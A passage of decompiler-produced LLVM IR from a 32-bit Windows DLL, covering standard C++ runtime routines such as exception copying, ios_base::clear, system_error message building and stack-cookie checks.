  br i1 %34, label %dec_label_pc_10001a89, label %dec_label_pc_10001a84, !insn.addr !392

dec_label_pc_10001a84:                            ; preds = %dec_label_pc_10001a7d
  %35 = call i32 @__invalid_parameter_noinfo_noreturn(), !insn.addr !393
  store i32 %35, i32* %eax.0.reg2mem, !insn.addr !393
  br label %dec_label_pc_10001a89, !insn.addr !393

dec_label_pc_10001a89:                            ; preds = %dec_label_pc_10001a84, %dec_label_pc_10001a7d
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %36 = sub i32 %25, %eax.0.reload, !insn.addr !394
  %37 = icmp ult i32 %36, 4, !insn.addr !395
  %38 = icmp eq i1 %37, false, !insn.addr !396
  store i32 %eax.0.reload, i32* %eax.1.reg2mem, !insn.addr !396
  br i1 %38, label %dec_label_pc_10001a95, label %dec_label_pc_10001a90, !insn.addr !396

dec_label_pc_10001a90:                            ; preds = %dec_label_pc_10001a89
  %39 = call i32 @__invalid_parameter_noinfo_noreturn(), !insn.addr !397
  store i32 %39, i32* %eax.1.reg2mem, !insn.addr !397
  br label %dec_label_pc_10001a95, !insn.addr !397

dec_label_pc_10001a95:                            ; preds = %dec_label_pc_10001a90, %dec_label_pc_10001a89
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  %40 = icmp ult i32 %36, 36
  store i32 %eax.1.reload, i32* %ecx.0.reg2mem, !insn.addr !398
  br i1 %40, label %dec_label_pc_10001aa1, label %dec_label_pc_10001a9a, !insn.addr !398

dec_label_pc_10001a9a:                            ; preds = %dec_label_pc_10001a95
  %41 = call i32 @__invalid_parameter_noinfo_noreturn(), !insn.addr !399
  store i32 %41, i32* %ecx.0.reg2mem, !insn.addr !399
  br label %dec_label_pc_10001aa1, !insn.addr !399

dec_label_pc_10001aa1:                            ; preds = %dec_label_pc_10001a95, %dec_label_pc_10001a9a, %dec_label_pc_10001a68
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %42 = add i32 %esp.0.reload, -20, !insn.addr !400
  %43 = inttoptr i32 %42 to i32*, !insn.addr !400
  store i32 %ecx.0.reload, i32* %43, align 4, !insn.addr !400
  call void @_free(i32* nonnull @1), !insn.addr !401
  br label %dec_label_pc_10001aaa, !insn.addr !402

dec_label_pc_10001aaa:                            ; preds = %dec_label_pc_10001aa1, %dec_label_pc_10001a43
  %44 = call i128 @__asm_movups.35(i128 undef), !insn.addr !403
  %45 = add i32 %arg2, 16, !insn.addr !404
  %46 = inttoptr i32 %45 to i32*, !insn.addr !404
  store i32 0, i32* %46, align 4, !insn.addr !404
  %47 = add i32 %arg2, 20, !insn.addr !405
  %48 = inttoptr i32 %47 to i32*, !insn.addr !405
  store i32 0, i32* %48, align 4, !insn.addr !405
  %49 = inttoptr i32 %arg2 to i128*, !insn.addr !406
  %50 = load i128, i128* %49, align 4, !insn.addr !406
  call void @__asm_movups(i128 %50, i128 %44), !insn.addr !406
  %51 = mul i64 %1, 4294967296
  %52 = sdiv i64 %51, 4294967296, !insn.addr !407
  %53 = call i128 @__asm_movq(i64 %52), !insn.addr !407
  %54 = inttoptr i32 %45 to i64*, !insn.addr !408
  %55 = load i64, i64* %54, align 4, !insn.addr !408
  call void @__asm_movq.31(i64 %55, i128 %53), !insn.addr !408
  %56 = load i32, i32* %stack_var_-28, align 4, !insn.addr !409
  call void @__writefsdword(i32 0, i32 %56), !insn.addr !410
  %57 = call i32 @"@__security_check_cookie@4"(), !insn.addr !411
  ret i32 %57, !insn.addr !412
}

define i32 @function_10001af0(i32 %arg1, i32 %arg2, i8* %arg3) local_unnamed_addr {
dec_label_pc_10001af0:
  %ecx.0.reg2mem = alloca i32, !insn.addr !413
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = call i128 @__decompiler_undefined_function_3()
  %3 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-48 = alloca i8, align 1
  %4 = trunc i32 %0 to i8, !insn.addr !414
  store i8 %4, i8* %stack_var_-48, align 1, !insn.addr !414
  %5 = ptrtoint i8* %arg3 to i32, !insn.addr !415
  %6 = call i32 @function_100060a0(i32 %5, i32 0, i32 -1, i8 0), !insn.addr !415
  %7 = bitcast i8* %stack_var_-48 to i32*, !insn.addr !416
  %8 = call i32 @function_100019e0(i32* nonnull %7, i32 %arg1, i32 %arg2), !insn.addr !416
  %9 = add i32 %1, 4, !insn.addr !417
  %10 = inttoptr i32 %1 to i32*, !insn.addr !418
  store i32 ptrtoint (%vtable_1002d2d4_type* @global_var_1002d2d4 to i32), i32* %10, align 4, !insn.addr !418
  %11 = call i128 @__asm_xorps(i128 %2, i128 %2), !insn.addr !419
  %12 = inttoptr i32 %9 to i64*, !insn.addr !420
  %13 = load i64, i64* %12, align 4, !insn.addr !420
  call void @__asm_movq.31(i64 %13, i128 %11), !insn.addr !420
  %14 = call i32 @___std_exception_copy(), !insn.addr !421
  store i32 ptrtoint (i32* @global_var_1002d2e0 to i32), i32* %10, align 4, !insn.addr !422
  %15 = icmp ult i32 %3, 16, !insn.addr !423
  br i1 %15, label %dec_label_pc_10001bb0, label %dec_label_pc_10001b81, !insn.addr !424

dec_label_pc_10001b81:                            ; preds = %dec_label_pc_10001af0
  %16 = load i8, i8* %stack_var_-48, align 1, !insn.addr !425
  %17 = sext i8 %16 to i32, !insn.addr !425
  %18 = add i32 %3, 1, !insn.addr !426
  %19 = icmp ult i32 %18, 4096, !insn.addr !427
  store i32 %17, i32* %ecx.0.reg2mem, !insn.addr !428
  br i1 %19, label %dec_label_pc_10001ba7, label %dec_label_pc_10001b8d, !insn.addr !428

dec_label_pc_10001b8d:                            ; preds = %dec_label_pc_10001b81
  %20 = and i32 %17, 31
  %21 = icmp eq i32 %20, 0, !insn.addr !429
  %22 = icmp eq i1 %21, false, !insn.addr !430
  br i1 %22, label %dec_label_pc_10001bd6, label %dec_label_pc_10001b92, !insn.addr !430

dec_label_pc_10001b92:                            ; preds = %dec_label_pc_10001b8d
  %23 = add nsw i32 %17, -4, !insn.addr !431
  %24 = inttoptr i32 %23 to i32*, !insn.addr !431
  %25 = load i32, i32* %24, align 4, !insn.addr !431
  %26 = icmp ult i32 %25, %17, !insn.addr !432
  %27 = icmp eq i1 %26, false, !insn.addr !433
  br i1 %27, label %dec_label_pc_10001bdb, label %dec_label_pc_10001b99, !insn.addr !433

dec_label_pc_10001b99:                            ; preds = %dec_label_pc_10001b92
  %28 = sub i32 %17, %25, !insn.addr !434
  %29 = icmp ult i32 %28, 4, !insn.addr !435
  br i1 %29, label %dec_label_pc_10001be0, label %dec_label_pc_10001ba0, !insn.addr !436

dec_label_pc_10001ba0:                            ; preds = %dec_label_pc_10001b99
  %30 = icmp ult i32 %28, 36
  store i32 %25, i32* %ecx.0.reg2mem, !insn.addr !437
  br i1 %30, label %dec_label_pc_10001ba7, label %dec_label_pc_10001be5, !insn.addr !437

dec_label_pc_10001ba7:                            ; preds = %dec_label_pc_10001ba0, %dec_label_pc_10001b81
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %31 = inttoptr i32 %ecx.0.reload to i32*, !insn.addr !438
  call void @_free(i32* %31), !insn.addr !438
  br label %dec_label_pc_10001bb0, !insn.addr !439

dec_label_pc_10001bb0:                            ; preds = %dec_label_pc_10001ba7, %dec_label_pc_10001af0
  %32 = add i32 %1, 12, !insn.addr !440
  %33 = inttoptr i32 %32 to i32*, !insn.addr !440
  store i32 %arg1, i32* %33, align 4, !insn.addr !440
  %34 = add i32 %1, 16, !insn.addr !441
  %35 = inttoptr i32 %34 to i32*, !insn.addr !441
  store i32 %arg2, i32* %35, align 4, !insn.addr !441
  store i32 ptrtoint (%vtable_1002d354_type* @global_var_1002d354 to i32), i32* %10, align 4, !insn.addr !442
  %36 = call i32 @"@__security_check_cookie@4"(), !insn.addr !443
  ret i32 %36, !insn.addr !444

dec_label_pc_10001bd6:                            ; preds = %dec_label_pc_10001b8d
  %37 = call i32 @__invalid_parameter_noinfo_noreturn(), !insn.addr !445
  br label %dec_label_pc_10001bdb, !insn.addr !445

dec_label_pc_10001bdb:                            ; preds = %dec_label_pc_10001bd6, %dec_label_pc_10001b92
  %38 = call i32 @__invalid_parameter_noinfo_noreturn(), !insn.addr !446
  br label %dec_label_pc_10001be0, !insn.addr !446

dec_label_pc_10001be0:                            ; preds = %dec_label_pc_10001bdb, %dec_label_pc_10001b99
  %39 = call i32 @__invalid_parameter_noinfo_noreturn(), !insn.addr !447
  br label %dec_label_pc_10001be5, !insn.addr !447

dec_label_pc_10001be5:                            ; preds = %dec_label_pc_10001ba0, %dec_label_pc_10001be0
  %40 = call i32 @__invalid_parameter_noinfo_noreturn(), !insn.addr !448
  %41 = call i32 @__asm_int3(), !insn.addr !449
  %42 = call i32 @__asm_int3(), !insn.addr !450
  %43 = call i32 @__asm_int3(), !insn.addr !451
  %44 = call i32 @__asm_int3(), !insn.addr !452
  %45 = call i32 @__asm_int3(), !insn.addr !453
  %46 = call i32 @__asm_int3(), !insn.addr !454
  ret i32 %46, !insn.addr !454
}

define i32 @function_10001bf0(i8 %arg1) {
dec_label_pc_10001bf0:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = call i32 @__decompiler_undefined_function_1()
  %3 = add i32 %2, 4, !insn.addr !455
  %4 = inttoptr i32 %2 to i32*, !insn.addr !456
  store i32 ptrtoint (%vtable_1002d2d4_type* @global_var_1002d2d4 to i32), i32* %4, align 4, !insn.addr !456
  %5 = call i32 @___std_exception_destroy(i32 %3, i32 %0, i32 %1), !insn.addr !457
  %6 = and i8 %arg1, 1, !insn.addr !458
  %7 = icmp eq i8 %6, 0, !insn.addr !458
  br i1 %7, label %dec_label_pc_10001c19, label %dec_label_pc_10001c0e, !insn.addr !459

dec_label_pc_10001c0e:                            ; preds = %dec_label_pc_10001bf0
  call void @"??3@YAXPAXI@Z"(i32* %4, i32 20), !insn.addr !460
  br label %dec_label_pc_10001c19, !insn.addr !461

dec_label_pc_10001c19:                            ; preds = %dec_label_pc_10001c0e, %dec_label_pc_10001bf0
  ret i32 %2, !insn.addr !462
}

define i32 @function_10001c20(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_10001c20:
  %ecx.0.reg2mem = alloca i32, !insn.addr !463
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-48 = alloca i8, align 1
  %stack_var_-16 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !464
  store i32 %1, i32* %stack_var_-16, align 4, !insn.addr !465
  %2 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !466
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !467
  store i8 0, i8* %stack_var_-48, align 1, !insn.addr !468
  store i32 %arg3, i32* %ecx.0.reg2mem, !insn.addr !469
  br label %dec_label_pc_10001c70, !insn.addr !469

dec_label_pc_10001c70:                            ; preds = %dec_label_pc_10001c70, %dec_label_pc_10001c20
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %3 = inttoptr i32 %ecx.0.reload to i8*, !insn.addr !470
  %4 = load i8, i8* %3, align 1, !insn.addr !470
  %5 = add i32 %ecx.0.reload, 1, !insn.addr !471
  %6 = icmp eq i8 %4, 0, !insn.addr !472
  %7 = icmp eq i1 %6, false, !insn.addr !473
  store i32 %5, i32* %ecx.0.reg2mem, !insn.addr !473
  br i1 %7, label %dec_label_pc_10001c70, label %dec_label_pc_10001c77, !insn.addr !473

dec_label_pc_10001c77:                            ; preds = %dec_label_pc_10001c70
  %8 = sub i32 %ecx.0.reload, %arg3, !insn.addr !474
  %9 = call i32 @function_10005030(i32 %arg3, i32 %8), !insn.addr !475
  %10 = call i32 @function_10001af0(i32 %arg1, i32 %arg2, i8* nonnull %stack_var_-48), !insn.addr !476
  %11 = inttoptr i32 %0 to i32*, !insn.addr !477
  store i32 ptrtoint (i32* @global_var_1002d360 to i32), i32* %11, align 4, !insn.addr !477
  %12 = load i32, i32* %stack_var_-16, align 4, !insn.addr !478
  call void @__writefsdword(i32 0, i32 %12), !insn.addr !479
  %13 = call i32 @"@__security_check_cookie@4"(), !insn.addr !480
  ret i32 %13, !insn.addr !481
}

define i32 @function_10001d10(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_10001d10:
  %ecx.0.reg2mem = alloca i32, !insn.addr !482
  %0 = call i32 @"?_Syserror_map@std@@YAPBDH@Z"(i32 %arg2), !insn.addr !483
  %1 = add i32 %arg1, 16, !insn.addr !484
  %2 = inttoptr i32 %1 to i32*, !insn.addr !484
  store i32 0, i32* %2, align 4, !insn.addr !484
  %3 = add i32 %arg1, 20, !insn.addr !485
  %4 = inttoptr i32 %3 to i32*, !insn.addr !485
  store i32 15, i32* %4, align 4, !insn.addr !485
  %5 = inttoptr i32 %arg1 to i8*, !insn.addr !486
  store i8 0, i8* %5, align 1, !insn.addr !486
  store i32 %0, i32* %ecx.0.reg2mem, !insn.addr !486
  br label %dec_label_pc_10001d43, !insn.addr !486

dec_label_pc_10001d43:                            ; preds = %dec_label_pc_10001d43, %dec_label_pc_10001d10
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %6 = inttoptr i32 %ecx.0.reload to i8*, !insn.addr !487
  %7 = load i8, i8* %6, align 1, !insn.addr !487
  %8 = add i32 %ecx.0.reload, 1, !insn.addr !488
  %9 = icmp eq i8 %7, 0, !insn.addr !489
  %10 = icmp eq i1 %9, false, !insn.addr !490
  store i32 %8, i32* %ecx.0.reg2mem, !insn.addr !490
  br i1 %10, label %dec_label_pc_10001d43, label %dec_label_pc_10001d4a, !insn.addr !490

dec_label_pc_10001d4a:                            ; preds = %dec_label_pc_10001d43
  %11 = sub i32 %ecx.0.reload, %0, !insn.addr !491
  %12 = call i32 @function_10005030(i32 %0, i32 %11), !insn.addr !492
  ret i32 %arg1, !insn.addr !493
}

define i32 @function_10001d60() {
dec_label_pc_10001d60:
  ret i32 ptrtoint ([9 x i8]* @global_var_1003919c to i32), !insn.addr !494
}

define i32 @function_10001d70(i32 %arg1, i32 %arg2) {
dec_label_pc_10001d70:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = icmp eq i32 %arg2, 1, !insn.addr !495
  %3 = icmp eq i1 %2, false, !insn.addr !496
  br i1 %3, label %dec_label_pc_10001daf, label %dec_label_pc_10001d87, !insn.addr !496

dec_label_pc_10001d87:                            ; preds = %dec_label_pc_10001d70
  %4 = add i32 %arg1, 16, !insn.addr !497
  %5 = inttoptr i32 %4 to i32*, !insn.addr !497
  store i32 0, i32* %5, align 4, !insn.addr !497
  %6 = add i32 %arg1, 20, !insn.addr !498
  %7 = inttoptr i32 %6 to i32*, !insn.addr !498
  store i32 15, i32* %7, align 4, !insn.addr !498
  %8 = inttoptr i32 %arg1 to i8*, !insn.addr !499
  store i8 0, i8* %8, align 1, !insn.addr !499
  %9 = call i32 @function_10005030(i32 ptrtoint ([22 x i8]* @global_var_100391a8 to i32), i32 21), !insn.addr !500
  ret i32 %arg1, !insn.addr !501

dec_label_pc_10001daf:                            ; preds = %dec_label_pc_10001d70
  %10 = call i32 @function_10001d10(i32 %arg1, i32 %arg2, i32 %0, i32 0, i32 %1), !insn.addr !502
  ret i32 %arg1, !insn.addr !503
}

define i32 @function_10001dc0(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10001dc0:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = call i32 @__decompiler_undefined_function_1()
  %3 = add i32 %arg2, 4, !insn.addr !504
  %4 = inttoptr i32 %3 to i32*, !insn.addr !504
  %5 = load i32, i32* %4, align 4, !insn.addr !504
  %6 = inttoptr i32 %arg2 to i32*, !insn.addr !505
  %7 = load i32, i32* %6, align 4, !insn.addr !505
  %8 = ptrtoint i8* %arg1 to i32, !insn.addr !506
  %9 = call i32 @function_10001c20(i32 %7, i32 %5, i32 %8, i32 %0, i32 %2, i32 %1), !insn.addr !506
  %10 = inttoptr i32 %2 to i32*, !insn.addr !507
  store i32 ptrtoint (i32* @global_var_1002d388 to i32), i32* %10, align 4, !insn.addr !507
  ret i32 %2, !insn.addr !508
}

define void @"?clear@ios_base@std@@QAEXH_N@Z"(i32* %result, i32 %arg2, i1 %arg3) local_unnamed_addr {
dec_label_pc_10001df0:
  %esp.1.reg2mem = alloca i32, !insn.addr !509
  %.pre-phi.reg2mem = alloca i32*, !insn.addr !509
  %esp.0.reg2mem = alloca i32, !insn.addr !509
  %0 = ptrtoint i32* %result to i32
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i8*, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %1 = and i32 %arg2, 23, !insn.addr !510
  %2 = add i32 %0, 12, !insn.addr !511
  %3 = inttoptr i32 %2 to i32*, !insn.addr !511
  store i32 %1, i32* %3, align 4, !insn.addr !511
  %4 = add i32 %0, 16, !insn.addr !512
  %5 = inttoptr i32 %4 to i32*, !insn.addr !512
  %6 = load i32, i32* %5, align 4, !insn.addr !512
  %7 = and i32 %6, %1, !insn.addr !513
  %8 = icmp eq i32 %7, 0, !insn.addr !513
  br i1 %8, label %dec_label_pc_10001e22, label %dec_label_pc_10001e09, !insn.addr !514

dec_label_pc_10001e09:                            ; preds = %dec_label_pc_10001df0
  %9 = icmp eq i1 %arg3, false, !insn.addr !515
  %10 = icmp eq i1 %9, false, !insn.addr !516
  br i1 %10, label %dec_label_pc_10001e28, label %dec_label_pc_10001e0f, !insn.addr !516

dec_label_pc_10001e0f:                            ; preds = %dec_label_pc_10001e09
  %11 = bitcast i32* %stack_var_-36 to i8*
  store i8* %11, i8** %stack_var_-48, align 4, !insn.addr !517
  %12 = and i32 %7, 4
  %13 = icmp eq i32 %12, 0, !insn.addr !518
  %14 = icmp eq i1 %13, false, !insn.addr !519
  br i1 %14, label %dec_label_pc_10001e31, label %dec_label_pc_10001e1b, !insn.addr !519

dec_label_pc_10001e1b:                            ; preds = %dec_label_pc_10001e0f
  %15 = ptrtoint i8** %stack_var_-48 to i32, !insn.addr !517
  %16 = and i32 %7, 2
  %17 = icmp eq i32 %16, 0, !insn.addr !520
  %18 = icmp eq i1 %17, false, !insn.addr !521
  store i32 %15, i32* %esp.0.reg2mem, !insn.addr !521
  br i1 %18, label %dec_label_pc_10001e57, label %dec_label_pc_10001e1b.dec_label_pc_10001e7d_crit_edge, !insn.addr !521

dec_label_pc_10001e1b.dec_label_pc_10001e7d_crit_edge: ; preds = %dec_label_pc_10001e1b
  %.pre = bitcast i8** %stack_var_-48 to i32*, !insn.addr !522
  store i32* %.pre, i32** %.pre-phi.reg2mem
  store i32 %15, i32* %esp.1.reg2mem
  br label %dec_label_pc_10001e7d

dec_label_pc_10001e22:                            ; preds = %dec_label_pc_10001df0
  ret void, !insn.addr !523

dec_label_pc_10001e28:                            ; preds = %dec_label_pc_10001e09
  store i8* null, i8** %stack_var_-48, align 4, !insn.addr !524
  %19 = call i32 @"__CxxThrowException@8"(), !insn.addr !525
  br label %dec_label_pc_10001e31, !insn.addr !525

dec_label_pc_10001e31:                            ; preds = %dec_label_pc_10001e28, %dec_label_pc_10001e0f
  %20 = call i32 @function_100019c0(i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !526
  store i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_100391c0, i32 0, i32 0), i8** %stack_var_-48, align 4, !insn.addr !527
  %21 = call i32 @function_10001dc0(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_100391c0, i32 0, i32 0), i32 %20), !insn.addr !528
  %22 = ptrtoint i32* %stack_var_-36 to i32, !insn.addr !529
  store i32 %22, i32* %stack_var_-56, align 4, !insn.addr !529
  %23 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !529
  %24 = call i32 @"__CxxThrowException@8"(), !insn.addr !530
  store i32 %23, i32* %esp.0.reg2mem, !insn.addr !530
  br label %dec_label_pc_10001e57, !insn.addr !530

dec_label_pc_10001e57:                            ; preds = %dec_label_pc_10001e31, %dec_label_pc_10001e1b
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %25 = call i32 @function_100019c0(i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !531
  %26 = add i32 %esp.0.reload, 4, !insn.addr !532
  %27 = inttoptr i32 %26 to i32*, !insn.addr !532
  store i32 %25, i32* %27, align 4, !insn.addr !532
  %28 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !533
  store i32 ptrtoint ([22 x i8]* @global_var_100391d8 to i32), i32* %28, align 4, !insn.addr !533
  %29 = call i32 @function_10001dc0(i8* bitcast (i32* @1 to i8*), i32 ptrtoint (i32* @1 to i32)), !insn.addr !534
  %30 = add i32 %esp.0.reload, -4, !insn.addr !535
  %31 = inttoptr i32 %30 to i32*, !insn.addr !535
  store i32 ptrtoint (i32* @global_var_1003be24 to i32), i32* %31, align 4, !insn.addr !535
  %32 = add i32 %esp.0.reload, 12, !insn.addr !536
  %33 = add i32 %esp.0.reload, -8, !insn.addr !537
  %34 = inttoptr i32 %33 to i32*
  store i32 %32, i32* %34, align 4, !insn.addr !537
  %35 = call i32 @"__CxxThrowException@8"(), !insn.addr !538
  store i32* %34, i32** %.pre-phi.reg2mem, !insn.addr !538
  store i32 %33, i32* %esp.1.reg2mem, !insn.addr !538
  br label %dec_label_pc_10001e7d, !insn.addr !538

dec_label_pc_10001e7d:                            ; preds = %dec_label_pc_10001e1b.dec_label_pc_10001e7d_crit_edge, %dec_label_pc_10001e57
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %.pre-phi.reload = load i32*, i32** %.pre-phi.reg2mem
  %36 = call i32 @function_100019c0(i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !539
  %37 = add i32 %esp.1.reload, 4, !insn.addr !540
  %38 = inttoptr i32 %37 to i32*, !insn.addr !540
  store i32 %36, i32* %38, align 4, !insn.addr !540
  store i32 ptrtoint ([21 x i8]* @global_var_100391f0 to i32), i32* %.pre-phi.reload, align 4, !insn.addr !522
  %39 = call i32 @function_10001dc0(i8* bitcast (i32* @1 to i8*), i32 ptrtoint (i32* @1 to i32)), !insn.addr !541
  %40 = add i32 %esp.1.reload, -4, !insn.addr !542
  %41 = inttoptr i32 %40 to i32*, !insn.addr !542
  store i32 ptrtoint (i32* @global_var_1003be24 to i32), i32* %41, align 4, !insn.addr !542
  %42 = add i32 %esp.1.reload, 12, !insn.addr !543
  %43 = add i32 %esp.1.reload, -8, !insn.addr !544
  %44 = inttoptr i32 %43 to i32*, !insn.addr !544
  store i32 %42, i32* %44, align 4, !insn.addr !544
  %45 = call i32 @"__CxxThrowException@8"(), !insn.addr !545
  %46 = call i32 @__asm_int3(), !insn.addr !546
  %47 = call i32 @__asm_int3(), !insn.addr !547
  %48 = call i32 @__asm_int3(), !insn.addr !548
  %49 = call i32 @__asm_int3(), !insn.addr !549
  %50 = call i32 @__asm_int3(), !insn.addr !550
  %51 = call i32 @__asm_int3(), !insn.addr !551
  %52 = call i32 @__asm_int3(), !insn.addr !552
  %53 = call i32 @__asm_int3(), !insn.addr !553
  %54 = call i32 @__asm_int3(), !insn.addr !554
  %55 = call i32 @__asm_int3(), !insn.addr !555
  %56 = call i32 @__asm_int3(), !insn.addr !556
  %57 = call i32 @__asm_int3(), !insn.addr !557
  %58 = call i32 @__asm_int3(), !insn.addr !558
  %59 = add i32 %esp.1.reload, -12, !insn.addr !559
  %60 = inttoptr i32 %59 to i32*, !insn.addr !559
  %61 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !559
  store i32 %61, i32* %60, align 4, !insn.addr !559
  %62 = add i32 %esp.1.reload, -16, !insn.addr !560
  %63 = inttoptr i32 %62 to i32*, !insn.addr !560
  store i32 -1, i32* %63, align 4, !insn.addr !560
  %64 = add i32 %esp.1.reload, -20, !insn.addr !561
  %65 = inttoptr i32 %64 to i32*, !insn.addr !561
  store i32 268617136, i32* %65, align 4, !insn.addr !561
  %66 = call i32 @__readfsdword(i32 0), !insn.addr !562
  %67 = add i32 %esp.1.reload, -24, !insn.addr !563
  %68 = inttoptr i32 %67 to i32*, !insn.addr !563
  store i32 %66, i32* %68, align 4, !insn.addr !563
  %69 = add i32 %esp.1.reload, -28, !insn.addr !564
  %70 = inttoptr i32 %69 to i32*, !insn.addr !564
  %71 = load i32, i32* @global_var_1003d070, align 4, !insn.addr !565
  %72 = xor i32 %71, %59, !insn.addr !566
  %73 = add i32 %esp.1.reload, -32, !insn.addr !567
  %74 = inttoptr i32 %73 to i32*, !insn.addr !567
  store i32 %72, i32* %74, align 4, !insn.addr !567
  call void @__writefsdword(i32 0, i32 %67), !insn.addr !568
  %75 = add i32 %esp.1.reload, 68, !insn.addr !569
  %76 = inttoptr i32 %75 to i32*, !insn.addr !569
  %77 = load i32, i32* %76, align 4, !insn.addr !569
  %78 = load i32, i32* %41, align 4, !insn.addr !570
  store i32 0, i32* %63, align 4, !insn.addr !571
  %79 = add i32 %77, 4, !insn.addr !572
  %80 = inttoptr i32 %79 to i32*, !insn.addr !572
  %81 = load i32, i32* %80, align 4, !insn.addr !572
  %82 = add i32 %78, 4, !insn.addr !573
  %83 = inttoptr i32 %82 to i32*, !insn.addr !573
  store i32 %81, i32* %83, align 4, !insn.addr !573
  %84 = load i32, i32* %68, align 4, !insn.addr !574
  call void @__writefsdword(i32 0, i32 %84), !insn.addr !575
  ret void, !insn.addr !576
}

define i32 @function_10001f00(i32 %arg1) local_unnamed_addr {
dec_label_pc_10001f00:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i128 @__decompiler_undefined_function_3()
  %2 = call i128 @__asm_xorps(i128 %1, i128 %1), !insn.addr !577
  %3 = add i32 %0, 4, !insn.addr !578
  %4 = inttoptr i32 %0 to i32*, !insn.addr !579
  store i32 ptrtoint (%vtable_1002d2d4_type* @global_var_1002d2d4 to i32), i32* %4, align 4, !insn.addr !579
  %5 = inttoptr i32 %3 to i64*, !insn.addr !580
  %6 = load i64, i64* %5, align 4, !insn.addr !580
  call void @__asm_movq.31(i64 %6, i128 %2), !insn.addr !580
  %7 = call i32 @___std_exception_copy(), !insn.addr !581
  store i32 ptrtoint (%vtable_1002d354_type* @global_var_1002d354 to i32), i32* %4, align 4, !insn.addr !582
  %8 = add i32 %arg1, 12, !insn.addr !583
  %9 = inttoptr i32 %8 to i32*, !insn.addr !583
  %10 = load i32, i32* %9, align 4, !insn.addr !583
  %11 = add i32 %0, 12, !insn.addr !584
  %12 = inttoptr i32 %11 to i32*, !insn.addr !584
  store i32 %10, i32* %12, align 4, !insn.addr !584
  %13 = add i32 %arg1, 16, !insn.addr !585
  %14 = inttoptr i32 %13 to i32*, !insn.addr !585
  %15 = load i32, i32* %14, align 4, !insn.addr !585
  %16 = add i32 %0, 16, !insn.addr !586
  %17 = inttoptr i32 %16 to i32*, !insn.addr !586
  store i32 %15, i32* %17, align 4, !insn.addr !586
  store i32 ptrtoint (i32* @global_var_1002d388 to i32), i32* %4, align 4, !insn.addr !587
  ret i32 %0, !insn.addr !588
}

define i32 @function_10001f50(i32 %arg1) local_unnamed_addr {
dec_label_pc_10001f50:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i128 @__decompiler_undefined_function_3()
  %2 = call i128 @__asm_xorps(i128 %1, i128 %1), !insn.addr !589
  %3 = add i32 %0, 4, !insn.addr !590
  %4 = inttoptr i32 %0 to i32*, !insn.addr !591
  store i32 ptrtoint (%vtable_1002d2d4_type* @global_var_1002d2d4 to i32), i32* %4, align 4, !insn.addr !591
  %5 = inttoptr i32 %3 to i64*, !insn.addr !592
  %6 = load i64, i64* %5, align 4, !insn.addr !592
  call void @__asm_movq.31(i64 %6, i128 %2), !insn.addr !592
  %7 = call i32 @___std_exception_copy(), !insn.addr !593
  store i32 ptrtoint (%vtable_1002d354_type* @global_var_1002d354 to i32), i32* %4, align 4, !insn.addr !594
  %8 = add i32 %arg1, 12, !insn.addr !595
  %9 = inttoptr i32 %8 to i32*, !insn.addr !595
  %10 = load i32, i32* %9, align 4, !insn.addr !595
  %11 = add i32 %0, 12, !insn.addr !596
  %12 = inttoptr i32 %11 to i32*, !insn.addr !596
  store i32 %10, i32* %12, align 4, !insn.addr !596
  %13 = add i32 %arg1, 16, !insn.addr !597
  %14 = inttoptr i32 %13 to i32*, !insn.addr !597
  %15 = load i32, i32* %14, align 4, !insn.addr !597
  %16 = add i32 %0, 16, !insn.addr !598
  %17 = inttoptr i32 %16 to i32*, !insn.addr !598
  store i32 %15, i32* %17, align 4, !insn.addr !598
  store i32 ptrtoint (i32* @global_var_1002d360 to i32), i32* %4, align 4, !insn.addr !599
  ret i32 %0, !insn.addr !600
}

define i32 @function_10001fa0(i32 %arg1) local_unnamed_addr {
dec_label_pc_10001fa0:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i128 @__decompiler_undefined_function_3()
  %2 = call i128 @__asm_xorps(i128 %1, i128 %1), !insn.addr !601
  %3 = add i32 %0, 4, !insn.addr !602
  %4 = inttoptr i32 %0 to i32*, !insn.addr !603
  store i32 ptrtoint (%vtable_1002d2d4_type* @global_var_1002d2d4 to i32), i32* %4, align 4, !insn.addr !603
  %5 = inttoptr i32 %3 to i64*, !insn.addr !604
  %6 = load i64, i64* %5, align 4, !insn.addr !604
  call void @__asm_movq.31(i64 %6, i128 %2), !insn.addr !604
